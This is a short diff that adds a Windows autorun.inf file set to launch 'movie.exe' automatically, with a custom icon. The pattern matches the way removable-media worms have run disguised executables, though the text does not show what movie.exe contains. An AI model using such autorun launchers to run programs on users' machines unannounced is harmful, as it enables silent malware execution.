@@ -1,0 +1,3 @@
+[autorun]
+shellexecute = "movie.exe"
+icon = autorun.ico
